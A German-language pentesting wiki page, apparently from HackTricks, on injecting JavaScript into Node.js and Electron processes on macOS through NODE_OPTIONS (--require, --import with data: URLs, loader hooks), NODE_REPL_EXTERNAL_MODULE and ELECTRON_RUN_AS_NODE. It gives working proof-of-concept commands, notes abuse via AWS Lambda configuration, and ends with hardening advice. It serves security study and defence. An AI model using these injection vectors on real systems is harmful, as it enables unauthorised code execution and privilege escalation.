# macOS Node.js Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Überblick

Wenn ein Angreifer die Umgebung eines Prozesses kontrollieren kann, der letztendlich **Node.js** startet (die Binärdatei `node` direkt oder ein beliebiges Node-basiertes CLI wie `npm`, `npx`, `yarn`, `pnpm`, `eslint`, `tsc`, `next`, …), ermöglichen mehrere Umgebungsvariablen der Runtime, **vom Angreifer kontrolliertes JavaScript zu laden und auszuführen, bevor das Zielprogramm startet**. Dies ist ein Code-Execution-Primitiv, das den Familien `PERL5OPT`/`RUBYOPT`/`_JAVA_OPTIONS` anderer Runtimes entspricht.

Der vorab geladene Code läuft **im selben Prozess** mit derselben UID, Umgebung, denselben File Descriptors und Entitlements wie das Opfer. Dadurch entsteht ein sauberer Injection-/Priv-esc-Vektor, sobald ein privilegierterer Prozess Node mit einer geerbten oder vom Angreifer beeinflussten Umgebung startet.

## `NODE_OPTIONS` — `--require` (file-backed)

`NODE_OPTIONS` wird so geparst, als enthielte es zusätzliche Command-Line-Flags. `--require` (`-r`) lädt ein CommonJS-Modul **vor** dem Entry Point vor, sodass dessen Code auf oberster Ebene zuerst ausgeführt wird.<sup>[[1]](#references)</sup>
```bash
# Target script
echo "console.log('target script ran')" > /tmp/victim.js

# Attacker-controlled preload module
echo "require('fs').writeFileSync('/tmp/node-require-executed','x'); console.log('[require preload]')" > /tmp/preload.js

NODE_OPTIONS="--require /tmp/preload.js" node /tmp/victim.js
# [require preload]
# target script ran
```
## `NODE_OPTIONS` — `--import` mit einer `data:`-URL (ohne Datei)

Seit **Node 20.6** akzeptiert `--import` eine `data:text/javascript,<code>`-URL, wodurch du ES-module JavaScript **inline vorladen kannst, ohne Datei auf der Festplatte und ohne Modulverzeichnis**. Der Code muss **vollständig URL-encoded** sein (ein unverändertes Leerzeichen oder `#` schneidet die data-URL ab und erzeugt einen `SyntaxError`).<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Build a fully URL-encoded data: URL payload
node -e 'const js="import(\"fs\").then(f=>f.writeFileSync(\"/tmp/node-import-executed\",\"x\"));console.log(\"[import preload]\")"; console.log("data:text/javascript,"+encodeURIComponent(js))' > /tmp/dataurl.txt

NODE_OPTIONS="--import $(cat /tmp/dataurl.txt)" node /tmp/victim.js
# [import preload]
# target script ran
```
Dies ist die Technik, die in der Cloud missbraucht wird, z. B. durch das Injizieren von `NODE_OPTIONS` in die Konfiguration einer AWS Lambda-Funktion (`lambda:UpdateFunctionConfiguration`, kein `iam:PassRole` erforderlich), um Code mit der Execution Role auszuführen.

> [!TIP]
> `NODE_OPTIONS` **kann Code nicht direkt ausführen**: Flags wie `--eval`/`-e`, `-p` oder ein Script-Pfad werden ausdrücklich abgelehnt (`node: --eval is not allowed in NODE_OPTIONS`). Verwende stattdessen `--require`/`--import`, um auf Code zu verweisen.

## `NODE_OPTIONS` — benutzerdefinierte Loader / andere Startup-Flags

`NODE_OPTIONS` berücksichtigt auch andere Startup-beeinflussende Flags, deren Nebeneffekt das Ausführen von Angreifer-Code ist, beispielsweise einen ESM-Loader-Hook:
```bash
# Node >= 20.6 (loader hooks run in a separate thread)
NODE_OPTIONS="--import ./hooks.mjs" node app.mjs
# Older Node
NODE_OPTIONS="--experimental-loader ./hooks.mjs" node app.mjs
```
Jeder Node-basierte Launcher, der einen untergeordneten `node`-Prozess startet, **gibt `NODE_OPTIONS` typischerweise weiter**. Dadurch kann eine einmalige Injection eine ganze Toolchain (`npm run …`, `npx`, Build-Tools, Test-Runner, Language-Server) beeinflussen.

## `NODE_REPL_EXTERNAL_MODULE`

Beim Start einer **interaktiven REPL** durch Node wird das von `NODE_REPL_EXTERNAL_MODULE` angegebene Modul geladen und dessen Code auf oberster Ebene ausgeführt. Dies ist nützlich, wenn das Opfer eine interaktive `node`-/`node -i`-Shell startet (Developer-Tools, Wartungskonsolen).<sup>[[3]](#references)</sup>
```bash
echo "require('fs').writeFileSync('/tmp/node-repl-executed','x'); module.exports={};" > /tmp/replmod.js
printf '.exit\n' | NODE_REPL_EXTERNAL_MODULE=/tmp/replmod.js node -i
ls -la /tmp/node-repl-executed
```
> [!WARNING]
> `NODE_REPL_EXTERNAL_MODULE` wird absichtlich **ignoriert**, wenn der Schutz [`kDisableNodeOptionsEnv`](https://nodejs.org/api/cli.html) verwendet wird, um einen Child-Prozess zu starten. Eine direkt gestartete interaktive REPL berücksichtigt die Variable jedoch.

## Electron (`ELECTRON_RUN_AS_NODE`)

Electron-Anwendungen stellen die vollständige Node-Laufzeit erneut bereit, wenn sie mit **`ELECTRON_RUN_AS_NODE=1`** gestartet werden. Ab diesem Zeitpunkt gelten alle oben genannten `NODE_OPTIONS`-Vektoren für die (häufig signierte bzw. mit Berechtigungen versehene) Electron-Binary. Siehe:

{{#ref}}
macos-electron-applications-injection.md
{{#endref}}

## Andere JS-Laufzeiten

- **Bun** liest `NODE_OPTIONS` aus Kompatibilitätsgründen und unterstützt sein eigenes `--preload` (konfigurierbar über `bunfig.toml`).
- **Deno** berücksichtigt `NODE_OPTIONS` nicht; stattdessen sind explizite Flags (`--import`, `--preload`) erforderlich. Daher ist es nicht durch ein geerbtes `NODE_OPTIONS` gefährdet.

Bestätige immer die genaue Laufzeit und Version, da sich die akzeptierten Flags zwischen Releases ändern.

## Hardening

- Entferne `NODE_OPTIONS`, `NODE_REPL_EXTERNAL_MODULE` und `ELECTRON_RUN_AS_NODE` aus der Umgebung, bevor Node aus einem privilegierteren Kontext gestartet wird; starte Child-Prozesse mit einer bereinigten Umgebung.
- Behandle die Möglichkeit, die Umgebung eines Ziels festzulegen (Config-Injection, `launchd`/`launchctl setenv`, plist/`EnvironmentVariables`, CI-Variablen, Lambda-/Container-Konfiguration), als gleichbedeutend mit Code Execution in jedem von ihm gestarteten Node-Prozess.
- Überwache die Prozessausführung auf diese Variablen genauso, wie [Shield](https://github.com/theevilbit/Shield) bei `ELECTRON_RUN_AS_NODE` und dyld injection variables warnt.

## References

- [1] [Node.js-CLI-Dokumentation — `NODE_OPTIONS`, `--require`, `--import`](https://nodejs.org/api/cli.html#node_optionsoptions)
- [2] [Node.js ESM — `--import` und `data:`-URLs](https://nodejs.org/api/esm.html#data-imports)
- [3] [Node.js REPL — `NODE_REPL_EXTERNAL_MODULE`](https://nodejs.org/api/repl.html#environment-variable-options)
{{#include ../../../banners/hacktricks-training.md}}
